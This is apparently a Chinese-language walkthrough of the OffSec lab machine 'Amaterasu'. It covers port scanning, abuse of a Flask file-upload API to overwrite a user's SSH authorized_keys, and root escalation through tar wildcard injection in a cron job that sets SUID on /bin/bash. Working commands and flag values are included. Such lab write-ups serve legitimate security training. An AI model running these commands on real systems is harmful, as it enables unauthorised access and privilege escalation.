# Amaterasu

2024-5-29 https://portal.offsec.com/labs/play

difficulty: easy

## IP

192.168.237.249

## Scan

Open Port -> 21,22,111,139,443,445,2049,10000,25022,33414,40080

```
PORT      STATE  SERVICE          VERSION
21/tcp    open   ftp              vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.49.57
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    closed ssh
111/tcp   closed rpcbind
139/tcp   closed netbios-ssn
443/tcp   closed https
445/tcp   closed microsoft-ds
2049/tcp  closed nfs
10000/tcp closed snet-sensor-mgmt
25022/tcp open   ssh              OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey:
|   256 68:c6:05:e8:dc:f2:9a:2a:78:9b:ee:a1:ae:f6:38:1a (ECDSA)
|_  256 e9:89:cc:c2:17:14:f3:bc:62:21:06:4a:5e:71:80:ce (ED25519)
33414/tcp open   unknown
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.2.3 Python/3.9.13
|     Date: Wed, 29 May 2024 11:50:07 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   Help:
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('HELP').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|     </html>
|   RTSPRequest:
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
40080/tcp open   http             Apache httpd 2.4.53 ((Fedora))
|_http-title: My test page
|_http-server-header: Apache/2.4.53 (Fedora)
| http-methods:
|_  Potentially risky methods: TRACE
```

开放端口很多，估计坑不少。

212 ftp 看看有什么，匿名登陆进去后，ls 卡住，看不到。

http://192.168.237.249:40080/ 使用 gobuster 扫描没找出什么信息。

看到 33414 这个端口，显示的 server 是 Werkzeug/2.2.3 Python/3.9.13，看看 Werkzeug 这个有没有什么漏洞，列出的 3 个都不能用。

http://192.168.237.249:33414/ gobuster 扫描发现了一个/help 目录：

```
["GET /info : General Info","GET /help : This listing","GET /file-list?dir=/tmp : List of the files","POST /file-upload : Upload files"]
```

看到有几个 api 接口。

http://192.168.237.249:33414/file-list?dir=/tmp 发现可以显示 /tmp 中的文件。

http://192.168.237.249:33414/file-list?dir=/home 同时发现可以显示 home 中的文件夹，存在系统内容泄露，发现一个用户 alfredo ，并且发现他的 id_rsa:

```
/file-list?dir=/home/alfredo/.ssh

["id_rsa","id_rsa.pub"]
```

http://192.168.237.249:33414/file-upload 可以上传文件，但是需要先构建上传接口。

这里的思路是找到 40080 端口对应的 web 服务的目录，然后上传 php 后门文件。通过 /file-list 发现 apache 根目录在 /var/www/html 目录中。

```
curl -F 'file=@/home/kali/Downloads/test.txt' -F 'filename=/tmp/1.txt' http://192.168.237.249:33414/file-upload

curl http://192.168.237.249:33414/file-list?dir=/tmp

["1.txt","flask.tar.gz","systemd-private-c73da0dad5364a9c80a6609690c2fcda-httpd.service-wXLGrj","systemd-private-c73da0dad5364a9c80a6609690c2fcda-ModemManager.service-hNfhpT","systemd-private-c73da0dad5364a9c80a6609690c2fcda-systemd-logind.service-kWkiZ6","systemd-private-c73da0dad5364a9c80a6609690c2fcda-chronyd.service-9lc593","systemd-private-c73da0dad5364a9c80a6609690c2fcda-dbus-broker.service-CGddV1","systemd-private-c73da0dad5364a9c80a6609690c2fcda-systemd-resolved.service-RakicW","systemd-private-c73da0dad5364a9c80a6609690c2fcda-systemd-oomd.service-Xii2Ge"]
```

或者使用 html 进行上传也可以实现：

```html
<!DOCTYPE html>
<html>
    <body>
        <form action="http://192.168.237.249:33414/file-upload" method="post" enctype="multipart/form-data">
            <input type="file" name="file" />
            <input name="filename" value="/tmp" />
            <input type="submit" />
        </form>
    </body>
</html>
```

或者使用 python 上传：

```python
import requests

url = 'http://192.168.237.249:33414/file-upload'
files = {'file': open('~/Downloads/test.txt', 'rb')}
data = {'filename': '/tmp/2.txt'}

response = requests.post(url, files=files, data=data)
print(response.text)
```

经过上传测试，发现 1.txt 已经上传到了 /tmp 中，但是经过测试，发现不能上传 php 后门到/var/www/html 中，估计是没有写权限。

在上面发现的 /home/alfredo/.ssh 目录中有 id_rsa ,尝试下能不能上传自己生成的 authorized_key，去覆盖目标机器上的 authorized_key：

```
curl -F 'file=@/home/kali/Downloads/authorized_keys' -F 'filename=/home/alfredo/.ssh/authorized_keys' http://192.168.237.249:33414/file-upload
{"message":"Allowed file types are txt, pdf, png, jpg, jpeg, gif"}
```

要将 authorized_keys 先改成 authorized_keys.txt ，再次上传：

```
curl -F 'file=@/home/kali/Downloads/authorized_keys.txt' -F 'filename=/home/alfredo/.ssh/authorized_keys' http://192.168.237.249:33414/file-upload

{"message":"File successfully uploaded"}
```

这时就能用 ssh 使用私钥进行登陆了：

```
ssh -i id_rsa alfredo@192.168.237.249 -p 25022

[alfredo@fedora ~]$ id
uid=1000(alfredo) gid=1000(alfredo) groups=1000(alfredo)
```

进行 flag 查找：

```
[alfredo@fedora ~]$ cat local.txt
d4de4211ddf999a8b2a3ae685a4af413
```

/etc/crontab 发现自定义计划任务：

```
*/1 * * * * root /usr/local/bin/backup-flask.sh
```

```
[alfredo@fedora ~]$ cat /usr/local/bin/backup-flask.sh
#!/bin/sh
export PATH="/home/alfredo/restapi:$PATH"
cd /home/alfredo/restapi
tar czf /tmp/flask.tar.gz *

[alfredo@fedora ~]$ ls -al /usr/local/bin/backup-flask.sh
-rwxr-xr-x. 1 root root 106 Mar 28  2023 /usr/local/bin/backup-flask.sh
```

tar 提权：

```
cd /home/alfredo/restapi
printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" >> --checkpoint=1
```

等待 1 分钟，/bin/bash 将有 suid 权限，执行 /bin/bash -p 就获得了 root 权限：

```
[alfredo@fedora restapi]$ ls -al /bin/bash
-rwsr-sr-x. 1 root root 1390080 Jan 25  2021 /bin/bash

[alfredo@fedora restapi]$ /bin/bash -p
bash-5.1# cd /root
bash-5.1# ls
anaconda-ks.cfg  build.sh  proof.txt  run.sh
bash-5.1# cat proof.txt
38f5c1f0b2534fad35f8fd45ff0fdb0e
```

最后看看 python 搭建的服务的源码：

```python
@app.route('/file-upload', methods=['POST'])
def upload_file():
    # check if the post request has the file part
    if 'file' not in request.files:
        resp = jsonify({'message' : 'No file part in the request'})
        resp.status_code = 400
        return resp
    if 'filename' not in request.form:
        resp = jsonify({'message' : 'No filename part in the request'})
        resp.status_code = 400
        return resp

    file = request.files['file']
    filename = request.form['filename']
    if file.filename == '':
        resp = jsonify({'message' : 'No file selected for uploading'})
        resp.status_code = 400
        return resp
    if file and allowed_file(file.filename):
        file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
        resp = jsonify({'message' : 'File successfully uploaded'})
        resp.status_code = 201
        return resp
    else:
        resp = jsonify({'message' : 'Allowed file types are txt, pdf, png, jpg, jpeg, gif'})
        resp.status_code = 400
        return resp
```
